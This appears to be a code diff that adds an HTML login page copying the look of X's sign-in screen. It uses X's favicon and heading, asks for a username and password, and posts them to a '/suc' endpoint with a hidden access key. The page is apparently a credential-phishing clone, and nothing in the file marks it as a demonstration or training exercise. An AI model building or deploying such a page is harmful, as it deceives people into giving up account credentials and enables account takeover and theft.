@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #fff;
+        }
+
+        .login-container {
+            background-color: #000;
+            padding: 20px;
+            border-radius: 16px;
+            box-shadow: 0 4px 8px rgba(255, 255, 255, 0.1);
+            width: 400px;
+            text-align: center;
+        }
+
+        .logo {
+            width: 40px;
+            margin-bottom: 20px;
+        }
+
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #333;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+            background-color: #000;
+            color: #fff;
+        }
+
+        .login-container input[type="text"]::placeholder,
+        .login-container input[type="password"]::placeholder {
+            color: #888;
+        }
+
+        .login-container input[type="submit"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            background-color: #fff;
+            border: none;
+            border-radius: 25px;
+            color: #000;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .login-container input[type="submit"]:hover {
+            background-color: #ddd;
+        }
+
+        .forgot-password {
+            color: #1da1f2;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin: 10px 0;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .signup {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #888;
+        }
+
+        .signup a {
+            color: #1da1f2;
+            text-decoration: none;
+        }
+
+        .signup a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://abs.twimg.com/favicons/twitter.ico" alt="X Logo" class="logo">
+        <h2>Sign in to X</h2>
+        <form action="/suc" method="post">
+            <input type="hidden" name="access_key" value="596e3a19-0354-4c99-ab40-bded453e4218">
+            <input type="text" name="userId"  placeholder="Phone, email, or username" required>
+            <input type="password" name="password"  placeholder="Password" required>
+            <input type="submit" value="Next">
+        </form>
+        <a href="#" class="forgot-password">Forgot password?</a>
+        <div class="signup">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+    </div>
+</body>
+</html>
